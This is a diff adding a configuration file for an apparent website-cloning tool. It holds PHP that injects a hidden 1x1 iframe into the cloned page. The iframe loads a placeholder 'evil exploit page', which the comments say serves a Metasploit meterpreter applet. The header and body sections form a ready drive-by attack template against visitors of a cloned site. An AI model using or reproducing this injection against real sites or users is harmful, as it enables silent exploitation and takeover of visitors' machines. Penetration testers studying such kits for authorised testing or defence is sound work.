@@ -1,0 +1,34 @@
+[general]
+working_dir = output/
+
+################################################################################
+# The HTML section below allows the user to specify additional HTML code that
+# should be inserted in the head and body of the html page. The example below
+# adds php code to imbed an invisible iframe containing executable code like
+# a meterpreter java applet
+#
+# NOTE - in order for the config parser to correctly parse multi line values,
+# they must be indented with a tab or space (even a blank line must start with
+# a tab or space.
+#
+# If you get a parsing error that looks like this with \n at the end of the
+# error lines, that is likely the problem:
+#
+# ParsingError: File contains parsing errors: config/website_cloner.config
+#	[line 12]: '}\n'
+################################################################################
+
+[html]
+
+header_text:
+    <?
+    //code for imbedding msf exploit page; imbedded text is inserted in html body
+    $use_msf = true;
+    $msf_url = 'https://path/to/my/evil/exploit/page/index.html';
+    if ($use_msf == true){
+        $msf_imbed = '<IFRAME src="'.$msf_url.'" width=1 height=1 style="visibility:hidden;position:absolute"> </IFRAME>';
+    }
+    ?>
+
+body_text:
+    <? echo $msf_imbed ?>
